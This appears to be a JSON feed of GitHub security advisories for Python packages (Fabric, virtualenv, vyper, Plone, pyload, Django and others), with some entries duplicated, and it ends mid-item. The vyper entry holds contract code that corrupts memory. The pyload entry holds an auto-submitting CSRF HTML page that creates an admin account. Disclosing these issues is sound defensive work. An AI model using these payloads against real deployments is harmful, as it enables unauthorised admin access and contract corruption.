{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>Fabric before 1.1.0 allows local users to overwrite arbitrary files via a symlink attack on (1) a <code>/tmp/fab.*.tar</code> file or (2) certain other files in the top level of <code>/tmp/</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-2185\">https://nvd.nist.gov/vuln/detail/CVE-2011-2185</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=710462\">https://bugzilla.redhat.com/show_bug.cgi?id=710462</a></li>\n<li><a href=\"http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=629003\">http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=629003</a></li>\n<li><a href=\"http://code.fabfile.org/projects/fabric/files/Fabric-1.1.0.tar.gz\">http://code.fabfile.org/projects/fabric/files/Fabric-1.1.0.tar.gz</a></li>\n<li><a href=\"http://lists.fedoraproject.org/pipermail/package-announce/2011-July/062534.html\">http://lists.fedoraproject.org/pipermail/package-announce/2011-July/062534.html</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2011/06/03/5\">http://www.openwall.com/lists/oss-security/2011/06/03/5</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2011/06/06/12\">http://www.openwall.com/lists/oss-security/2011/06/06/12</a></li>\n<li><a href=\"https://github.com/fabric/fabric/commit/3445b5653cd297039443110548fb3cab2e8e25af\">https://github.com/fabric/fabric/commit/3445b5653cd297039443110548fb3cab2e8e25af</a></li>\n<li><a href=\"https://github.com/fabric/fabric/commit/d7470d2db919ffcee80c245cf87e6d8d4ba6909c\">https://github.com/fabric/fabric/commit/d7470d2db919ffcee80c245cf87e6d8d4ba6909c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xwg2-qc6c-7c3q\">https://github.com/advisories/GHSA-xwg2-qc6c-7c3q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xwg2-qc6c-7c3q",
            "title": "[fabric] Fabric vulnerable to symlink attack on tmp files",
            "date_modified": "2024-01-19T18:16:50.000Z",
            "date_published": "2022-05-17T05:40:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xwg2-qc6c-7c3q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>virtualenv.py in virtualenv before 1.5 allows local users to overwrite arbitrary files via a symlink attack on a certain file in /tmp/.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-4617\">https://nvd.nist.gov/vuln/detail/CVE-2011-4617</a></li>\n<li><a href=\"http://lists.fedoraproject.org/pipermail/package-announce/2012-January/071638.html\">http://lists.fedoraproject.org/pipermail/package-announce/2012-January/071638.html</a></li>\n<li><a href=\"http://lists.fedoraproject.org/pipermail/package-announce/2012-January/071643.html\">http://lists.fedoraproject.org/pipermail/package-announce/2012-January/071643.html</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/12/19/2\">http://openwall.com/lists/oss-security/2011/12/19/2</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/12/19/4\">http://openwall.com/lists/oss-security/2011/12/19/4</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/12/19/5\">http://openwall.com/lists/oss-security/2011/12/19/5</a></li>\n<li><a href=\"https://github.com/pypa/virtualenv/commit/68075ad9ededf7df2c46d385f836c13b729de2ca\">https://github.com/pypa/virtualenv/commit/68075ad9ededf7df2c46d385f836c13b729de2ca</a></li>\n<li><a href=\"https://web.archive.org/web/20200228151935/https://bitbucket.org/ianb/virtualenv/commits/8be37c509fe5\">https://web.archive.org/web/20200228151935/https://bitbucket.org/ianb/virtualenv/commits/8be37c509fe5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3jhc-wjqf-5f2c\">https://github.com/advisories/GHSA-3jhc-wjqf-5f2c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3jhc-wjqf-5f2c",
            "title": "[virtualenv] Virtualenv Allows Symlink Attack on /tmp/",
            "date_modified": "2024-01-19T17:40:43.000Z",
            "date_published": "2022-05-17T05:35:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3jhc-wjqf-5f2c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><code>concat</code> built-in can write over the bounds of the memory buffer that was allocated for it and thus overwrite existing valid data. The root cause is that the <code>build_IR</code> for <code>concat</code> doesn't properly adhere to the API of copy functions (for <code>&gt;=0.3.2</code> the <code>copy_bytes</code> function).</p>\n<p>A contract search was performed and no vulnerable contracts were found in production.</p>\n<p>Tracked in issue <a href=\"https://github.com/vyperlang/vyper/issues/3737\">https://github.com/vyperlang/vyper/issues/3737</a></p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>build_IR</code> allocates a new internal variable for the concatenation: <a href=\"https://github.com/vyperlang/vyper/blob/3b310d5292c4d1448e673d7b3adb223f9353260e/vyper/builtins/functions.py#L534-L550\">https://github.com/vyperlang/vyper/blob/3b310d5292c4d1448e673d7b3adb223f9353260e/vyper/builtins/functions.py#L534-L550</a></p>\n<p>Notice that the buffer is allocated for the <code>maxlen</code> + 1 word to actually hold the length of the array.</p>\n<p>Later the <code>copy_bytes</code> function is used to copy the actual source arguments to the destination: <a href=\"https://github.com/vyperlang/vyper/blob/3b310d5292c4d1448e673d7b3adb223f9353260e/vyper/builtins/functions.py#L569-L572\">https://github.com/vyperlang/vyper/blob/3b310d5292c4d1448e673d7b3adb223f9353260e/vyper/builtins/functions.py#L569-L572</a></p>\n<p>The <code>dst_data</code> is defined via:</p>\n<ul>\n<li><code>data ptr</code> - to skip the 1 word that holds the length</li>\n<li><code>offset</code>  - to skip the source arguments that were already written to the buffer<ul>\n<li>the <code>offset</code> is increased via: <code>[\"set\", ofst, [\"add\", ofst, arglen]]</code>, ie it is increased by the length of the source argument</li>\n</ul>\n</li>\n</ul>\n<p>Now, the <code>copy_bytes</code> function has multiple control flow paths, the following ones are of interest:</p>\n<ol>\n<li><a href=\"https://github.com/vyperlang/vyper/blob/3b310d5292c4d1448e673d7b3adb223f9353260e/vyper/codegen/core.py#L270-L273\">https://github.com/vyperlang/vyper/blob/3b310d5292c4d1448e673d7b3adb223f9353260e/vyper/codegen/core.py#L270-L273</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/blob/3b310d5292c4d1448e673d7b3adb223f9353260e/vyper/codegen/core.py#L301-L320\">https://github.com/vyperlang/vyper/blob/3b310d5292c4d1448e673d7b3adb223f9353260e/vyper/codegen/core.py#L301-L320</a></li>\n</ol>\n<p>Note that the function itself contains the following note: \n<a href=\"https://github.com/vyperlang/vyper/blob/3b310d5292c4d1448e673d7b3adb223f9353260e/vyper/codegen/core.py#L245-L247\">https://github.com/vyperlang/vyper/blob/3b310d5292c4d1448e673d7b3adb223f9353260e/vyper/codegen/core.py#L245-L247</a></p>\n<p>That is we can ask for a copy of <code>1B</code> yet a whole word is copied.</p>\n<p>Consider the first interesting path -  if the <code>dst_data</code>'s distance to the end of the concat data buffer is <code>&lt; 32B</code>, the <code>copy_op = STORE(dst, LOAD(src))</code> from <code>copy_bytes</code> will result in buffer overflow as it essentially will <code>mstore</code> to <code>dst_data</code> the <code>mload</code> of the source (mload will load whole word and the distance of the <code>dst_data</code> to the word boundary is <code>&lt;32B</code>).</p>\n<p>From the two mentioned paths in <code>copy_bytes</code> it can be seen that both sources from memory and storage can cause the corruption.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>The main attack vector that was found was when the <code>concat</code> is inside an <code>internal</code> function.  Suppose we have an <code>external</code> function that calls <code>internal</code> one. In such case the address space is divided such that the memory for the internal function is in <em>lower</em>  portion of the adr space. As such the buffer overflow can overwrite <em>valid</em> data of the caller.</p>\n<p>Here is a simple example:</p>\n<pre><code class=\"language-python\">#@version ^0.3.9\n\n@internal\ndef bar() -&gt; uint256:\n    sss: String[2] = concat(\"a\", \"b\") \n    return 1\n\n\n@external\ndef foo() -&gt; int256:\n    a: int256 = -1\n    b: uint256 = self.bar()\n    return a \n</code></pre>\n<p><code>foo</code> should clearly return <code>-1</code>, but it returns <code>452312848583266388373324160190187140051835877600158453279131187530910662655</code></p>\n<p><code>-1</code> was used intentionally due to its bit structure but the value here is fairly irelevant. In this example during the second iteration of the for loop in the <code>build_IR</code> <code>mload</code> to <code>dst+1</code> will be executed (because len('a') == 1), thus the function will write <code>1B</code> over the bounds of the buffer. The string 'b' is stored such that its right-most byte is a zero byte. So a zero byte will be written over the bounds.  So when <code>-1</code> is considered it's left-most B will be overwritten to all 0. Therefore it can be seen: <code>452312848583266388373324160190187140051835877600158453279131187530910662655 == (2**248-1)</code> will output <code>True</code>.</p>\n<h4 id=\"ir\">IR</h4>\n<p>If we look at the contract's IR (vyper --no optimize -f ir), we see:</p>\n<pre><code># Line 30\n                          /* a: int256 = -1 */ [mstore, 320, -1 &lt;-1&gt;],\n</code></pre>\n<p>And for the second iteration of the loop in concat:</p>\n<pre><code> len,\n                        [mload, arg],\n                        [seq,\n                          [with,\n                            src,\n                            [add, arg, 32],\n                            [with,\n                              dst,\n                              [add, [add, 256 &lt;concat destination&gt;, 32], concat_ofst],\n                              [mstore, dst, [mload, src]]]],\n                          [set, concat_ofst, [add, concat_ofst, len]]]]],\n                    [mstore, 256 &lt;concat destination&gt;, concat_ofst],\n                    256 &lt;concat destination&gt;]],\n</code></pre>\n<p>So the address of the <code>int</code> is 320. </p>\n<p>The <code>dst</code> is defined as: <code>[add, [add, 256 &lt;concat destination&gt;, 32], concat_ofst],</code>.\nIn the second iteration the <code>concat_ofst</code> will be 1 because <code>len('a)==1</code> so <code>256+32+1 = 289</code>. Now this address will be <code>mstored</code> to - so the last mstored B will have the address <code>289+32=320</code> which clearly overlaps with the address of the <code>int a</code>.</p>\n<h4 id=\"poc-2\">PoC 2</h4>\n<p>Due to how <code>immutables</code> are handled, they can be corrupted too:</p>\n<pre><code class=\"language-python\">#@version ^0.3.9\n\ni: immutable(int256)\n\n@external\ndef __init__():\n    i = -1\n    s: String[2] = concat(\"a\", \"b\")\n\n@external\ndef foo() -&gt; int256:\n    return i\n</code></pre>\n<p>Output of calling <code>foo()</code> = <code>452312848583266388373324160190187140051835877600158453279131187530910662655</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>The buffer overflow can result in the change of semantics of the contract. The overflow is length-dependent and thus it might go unnoticed during contract testing.</p>\n<p>However, certainly not all usages of <code>concat</code> will result in overwritten valid data as we require it to be in an <code>internal</code> function and close to the <code>return</code> statement where other memory allocations don't occur. </p>\n<h3 id=\"concluding-remarks\">Concluding remarks</h3>\n<p>The bug based on the fast path in <code>copy_bytes</code> was likely introduced in: <code>548d35d720fb6fd8efbdc0ce525bed259a73f0b9</code>. <code>git bisect</code> was used between v0.3.1 and v0.3.2, <code>forge test</code> was run and the test asserted that the function indeed returns -1.</p>\n<p>For the general case, <code>0.3.0</code> and <code>0.3.1</code> are also affected. This issue has been addressed in commit <code>55e18f6d1</code> which will be included in future releases. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-2q8v-3gqq-4f8p\">https://github.com/vyperlang/vyper/security/advisories/GHSA-2q8v-3gqq-4f8p</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22419\">https://nvd.nist.gov/vuln/detail/CVE-2024-22419</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/issues/3737\">https://github.com/vyperlang/vyper/issues/3737</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/commit/55e18f6d128b2da8986adbbcccf1cd59a4b9ad6f\">https://github.com/vyperlang/vyper/commit/55e18f6d128b2da8986adbbcccf1cd59a4b9ad6f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2q8v-3gqq-4f8p\">https://github.com/advisories/GHSA-2q8v-3gqq-4f8p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2q8v-3gqq-4f8p",
            "title": "[vyper] concat built-in can corrupt memory in vyper",
            "date_modified": "2024-01-19T16:19:52.000Z",
            "date_published": "2024-01-19T16:19:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2q8v-3gqq-4f8p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A Cross-Frame Scripting vulnerability has been found on Plone CMS affecting version below 6.0.5. An attacker could store a malicious URL to be opened by an administrator and execute a malicios iframe element.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-0669\">https://nvd.nist.gov/vuln/detail/CVE-2024-0669</a></li>\n<li><a href=\"https://www.incibe.es/en/incibe-cert/notices/aviso/cross-frame-scripting-xfs-plone-cms\">https://www.incibe.es/en/incibe-cert/notices/aviso/cross-frame-scripting-xfs-plone-cms</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5xfx-55x4-j223\">https://github.com/advisories/GHSA-5xfx-55x4-j223</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5xfx-55x4-j223",
            "title": "[Plone] Cross-Frame Scripting vulnerability has been found on Plone CMS",
            "date_modified": "2024-01-19T16:02:34.000Z",
            "date_published": "2024-01-18T15:30:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5xfx-55x4-j223"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>pyload</code> API allows any API call to be made using GET requests. Since the session cookie is not set to <code>SameSite: strict</code>, this opens the library up to severe attack possibilities via a Cross-Site Request Forgery (CSRF) attack. This proof of concept shows how an unauthenticated user could trick the administrator's browser into creating a new admin user.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>We host the following HTML file on an attacker-controlled server.</p>\n<pre><code class=\"language-html\">&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n    &lt;form action=\"http://localhost:8000/api/add_user/%22hacker%22,%22hacker%22\"&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>If we now trick an administrator into visiting our malicious page at <code>https://attacker.com/CSRF.html</code>, we see that their browser will make a request to <code>/api/add_user/%22hacker%22,%22hacker%22</code>, adding a new administrator to the <code>pyload</code> application.\n<img alt=\"image\" src=\"https://user-images.githubusercontent.com/44903767/294942232-d874e838-f8eb-492f-98df-2d16ba74ff25.png\"></p>\n<p>The attacker can now authenticate as this newly created administrator user with the username <code>hacker</code> and password <code>hacker</code>.\n<img alt=\"image\" src=\"https://user-images.githubusercontent.com/44903767/294942635-c6d9adca-0f3a-4d99-92ac-6d3bf8e9ee01.png\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Any API call can be made via a CSRF attack by an unauthenticated user.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pyload/pyload/security/advisories/GHSA-pgpj-v85q-h5fm\">https://github.com/pyload/pyload/security/advisories/GHSA-pgpj-v85q-h5fm</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22416\">https://nvd.nist.gov/vuln/detail/CVE-2024-22416</a></li>\n<li><a href=\"https://github.com/pyload/pyload/commit/1374c824271cb7e927740664d06d2e577624ca3e\">https://github.com/pyload/pyload/commit/1374c824271cb7e927740664d06d2e577624ca3e</a></li>\n<li><a href=\"https://github.com/pyload/pyload/commit/c7cdc18ad9134a75222974b39e8b427c4af845fc\">https://github.com/pyload/pyload/commit/c7cdc18ad9134a75222974b39e8b427c4af845fc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pgpj-v85q-h5fm\">https://github.com/advisories/GHSA-pgpj-v85q-h5fm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pgpj-v85q-h5fm",
            "title": "[pyload-ng] Cross-Site Request Forgery on any API call in pyLoad may lead to admin privilege escalation",
            "date_modified": "2024-01-19T15:27:13.000Z",
            "date_published": "2024-01-19T15:27:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pgpj-v85q-h5fm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Installations of jupyter-lsp running in environments without configured file system access control (on the operating system level), and with jupyter-server instances exposed to non-trusted network are vulnerable to unauthorised access and modification of file system beyond the jupyter root directory. Please note this vulnerability is in the extension and is patched in version 2.2.2 of that extension. This extension has been updated in jupyterlab-lsp version 5.0.2.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Version 2.2.2 has been patched.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Users of jupyterlab who do not use jupyterlab-lsp can uninstall jupyter-lsp.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>We would like to credit Bary Levy, researcher of pillar.security research team, for the discovery and responsible disclosure of this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyter-lsp/jupyterlab-lsp/security/advisories/GHSA-4qhp-652w-c22x\">https://github.com/jupyter-lsp/jupyterlab-lsp/security/advisories/GHSA-4qhp-652w-c22x</a></li>\n<li><a href=\"https://github.com/jupyter-lsp/jupyterlab-lsp/releases/tag/v5.0.2\">https://github.com/jupyter-lsp/jupyterlab-lsp/releases/tag/v5.0.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4qhp-652w-c22x\">https://github.com/advisories/GHSA-4qhp-652w-c22x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4qhp-652w-c22x",
            "title": "[jupyter-lsp] Unsecured endpoints in the jupyter-lsp server extension",
            "date_modified": "2024-01-18T16:12:28.000Z",
            "date_published": "2024-01-18T16:12:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4qhp-652w-c22x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The <code>verify_exists</code> functionality in the URLField implementation in Django before 1.2.7 and 1.3.x before 1.3.1 originally tests a URL's validity through a HEAD request, but then uses a GET request for the new target URL in the case of a redirect, which might allow remote attackers to trigger arbitrary GET requests with an unintended source IP address via a crafted Location header.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-4138\">https://nvd.nist.gov/vuln/detail/CVE-2011-4138</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=737366\">https://bugzilla.redhat.com/show_bug.cgi?id=737366</a></li>\n<li><a href=\"https://hermes.opensuse.org/messages/14700881\">https://hermes.opensuse.org/messages/14700881</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2011/sep/09/\">https://www.djangoproject.com/weblog/2011/sep/09/</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2011/sep/10/127/\">https://www.djangoproject.com/weblog/2011/sep/10/127/</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/09/11/1\">http://openwall.com/lists/oss-security/2011/09/11/1</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/09/13/2\">http://openwall.com/lists/oss-security/2011/09/13/2</a></li>\n<li><a href=\"http://www.debian.org/security/2011/dsa-2332\">http://www.debian.org/security/2011/dsa-2332</a></li>\n<li><a href=\"https://github.com/django/django/commit/1a76dbefdfc60e2d5954c0ba614c3d054ba9c3f0\">https://github.com/django/django/commit/1a76dbefdfc60e2d5954c0ba614c3d054ba9c3f0</a></li>\n<li><a href=\"https://github.com/django/django/commit/7268f8af86186518821d775c530d5558fd726930\">https://github.com/django/django/commit/7268f8af86186518821d775c530d5558fd726930</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wxg3-mfph-qg9w\">https://github.com/advisories/GHSA-wxg3-mfph-qg9w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wxg3-mfph-qg9w",
            "title": "[Django] Django Might Allow CSRF Requests via URL Verification",
            "date_modified": "2024-01-16T22:48:10.000Z",
            "date_published": "2022-05-14T03:49:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wxg3-mfph-qg9w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The <code>verify_exists</code> functionality in the URLField implementation in Django before 1.2.7 and 1.3.x before 1.3.1 originally tests a URL's validity through a HEAD request, but then uses a GET request for the new target URL in the case of a redirect, which might allow remote attackers to trigger arbitrary GET requests with an unintended source IP address via a crafted Location header.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-4138\">https://nvd.nist.gov/vuln/detail/CVE-2011-4138</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=737366\">https://bugzilla.redhat.com/show_bug.cgi?id=737366</a></li>\n<li><a href=\"https://hermes.opensuse.org/messages/14700881\">https://hermes.opensuse.org/messages/14700881</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2011/sep/09/\">https://www.djangoproject.com/weblog/2011/sep/09/</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2011/sep/10/127/\">https://www.djangoproject.com/weblog/2011/sep/10/127/</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/09/11/1\">http://openwall.com/lists/oss-security/2011/09/11/1</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/09/13/2\">http://openwall.com/lists/oss-security/2011/09/13/2</a></li>\n<li><a href=\"http://www.debian.org/security/2011/dsa-2332\">http://www.debian.org/security/2011/dsa-2332</a></li>\n<li><a href=\"https://github.com/django/django/commit/1a76dbefdfc60e2d5954c0ba614c3d054ba9c3f0\">https://github.com/django/django/commit/1a76dbefdfc60e2d5954c0ba614c3d054ba9c3f0</a></li>\n<li><a href=\"https://github.com/django/django/commit/7268f8af86186518821d775c530d5558fd726930\">https://github.com/django/django/commit/7268f8af86186518821d775c530d5558fd726930</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wxg3-mfph-qg9w\">https://github.com/advisories/GHSA-wxg3-mfph-qg9w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wxg3-mfph-qg9w",
            "title": "[Django] Django Might Allow CSRF Requests via URL Verification",
            "date_modified": "2024-01-16T22:48:10.000Z",
            "date_published": "2022-05-14T03:49:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wxg3-mfph-qg9w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Django before 1.2.7 and 1.3.x before 1.3.1 uses a request's HTTP Host header to construct a full URL in certain circumstances, which allows remote attackers to conduct cache poisoning attacks via a crafted request.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-4139\">https://nvd.nist.gov/vuln/detail/CVE-2011-4139</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=737366\">https://bugzilla.redhat.com/show_bug.cgi?id=737366</a></li>\n<li><a href=\"https://hermes.opensuse.org/messages/14700881\">https://hermes.opensuse.org/messages/14700881</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2011/sep/09/\">https://www.djangoproject.com/weblog/2011/sep/09/</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2011/sep/10/127/\">https://www.djangoproject.com/weblog/2011/sep/10/127/</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/09/11/1\">http://openwall.com/lists/oss-security/2011/09/11/1</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/09/13/2\">http://openwall.com/lists/oss-security/2011/09/13/2</a></li>\n<li><a href=\"http://www.debian.org/security/2011/dsa-2332\">http://www.debian.org/security/2011/dsa-2332</a></li>\n<li><a href=\"https://github.com/django/django/commit/2f7fadc38efa58ac0a8f93f936b82332a199f396\">https://github.com/django/django/commit/2f7fadc38efa58ac0a8f93f936b82332a199f396</a></li>\n<li><a href=\"https://github.com/django/django/commit/c613af4d6485586c79d692b70a9acac429f3ca9d\">https://github.com/django/django/commit/c613af4d6485586c79d692b70a9acac429f3ca9d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rm2j-x595-q9cj\">https://github.com/advisories/GHSA-rm2j-x595-q9cj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rm2j-x595-q9cj",
            "title": "[django] Django Vulnerable to Cache Poisoning",
            "date_modified": "2024-01-16T22:48:00.000Z",
            "date_published": "2022-05-14T03:49:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rm2j-x595-q9cj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Django before 1.2.7 and 1.3.x before 1.3.1 uses a request's HTTP Host header to construct a full URL in certain circumstances, which allows remote attackers to conduct cache poisoning attacks via a crafted request.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-4139\">https://nvd.nist.gov/vuln/detail/CVE-2011-4139</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=737366\">https://bugzilla.redhat.com/show_bug.cgi?id=737366</a></li>\n<li><a href=\"https://hermes.opensuse.org/messages/14700881\">https://hermes.opensuse.org/messages/14700881</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2011/sep/09/\">https://www.djangoproject.com/weblog/2011/sep/09/</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2011/sep/10/127/\">https://www.djangoproject.com/weblog/2011/sep/10/127/</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/09/11/1\">http://openwall.com/lists/oss-security/2011/09/11/1</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/09/13/2\">http://openwall.com/lists/oss-security/2011/09/13/2</a></li>\n<li><a href=\"http://www.debian.org/security/2011/dsa-2332\">http://www.debian.org/security/2011/dsa-2332</a></li>\n<li><a href=\"https://github.com/django/django/commit/2f7fadc38efa58ac0a8f93f936b82332a199f396\">https://github.com/django/django/commit/2f7fadc38efa58ac0a8f93f936b82332a199f396</a></li>\n<li><a href=\"https://github.com/django/django/commit/c613af4d6485586c79d692b70a9acac429f3ca9d\">https://github.com/django/django/commit/c613af4d6485586c79d692b70a9acac429f3ca9d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rm2j-x595-q9cj\">https://github.com/advisories/GHSA-rm2j-x595-q9cj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rm2j-x595-q9cj",
            "title": "[django] Django Vulnerable to Cache Poisoning",
            "date_modified": "2024-01-16T22:48:00.000Z",
            "date_published": "2022-05-14T03:49:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rm2j-x595-q9cj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability could have allowed an attacker to include arbitrary HTML content in search results by having a user search a malicious project. This was due to our search client not correctly escaping all user content from search results. You can find more information in the <a href=\"https://github.com/readthedocs/readthedocs.org/security/advisories/GHSA-qhqx-5j25-rv48\">advisory published in our readthedocs.org repo</a>.</p>\n<p>Users of this extension should update to the 0.3.2 version, and trigger a new build.</p>\n<p>This issue was discovered by a member of our team, and we have seen no signs that this vulnerability was exploited in the wild.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue has been patched in our 0.3.2 version. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/readthedocs/readthedocs-sphinx-search/commit/8c6f6d01e88e72ef32ed0c220b6c19d1e1121c73\">https://github.com/readthedocs/readthedocs-sphinx-search/commit/8c6f6d01e88e72ef32ed0c220b6c19d1e1121c73</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, email us at <a href=\"mailto:security@readthedocs.org\">security@readthedocs.org</a> (<a href=\"https://docs.readthedocs.io/page/security.html#pgp-key\">PGP</a>)</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/readthedocs/readthedocs-sphinx-search/security/advisories/GHSA-xgfm-fjx6-62mj\">https://github.com/readthedocs/readthedocs-sphinx-search/security/advisories/GHSA-xgfm-fjx6-62mj</a></li>\n<li><a href=\"https://github.com/readthedocs/readthedocs-sphinx-search/commit/8c6f6d01e88e72ef32ed0c220b6c19d1e1121c73\">https://github.com/readthedocs/readthedocs-sphinx-search/commit/8c6f6d01e88e72ef32ed0c220b6c19d1e1121c73</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xgfm-fjx6-62mj\">https://github.com/advisories/GHSA-xgfm-fjx6-62mj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xgfm-fjx6-62mj",
            "title": "[readthedocs-sphinx-search] readthedocs-sphinx-search vulnerable to cross-site scripting when including search results from malicious projects",
            "date_modified": "2024-01-16T20:48:16.000Z",
            "date_published": "2024-01-16T20:48:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xgfm-fjx6-62mj"
            },
            "tags": [
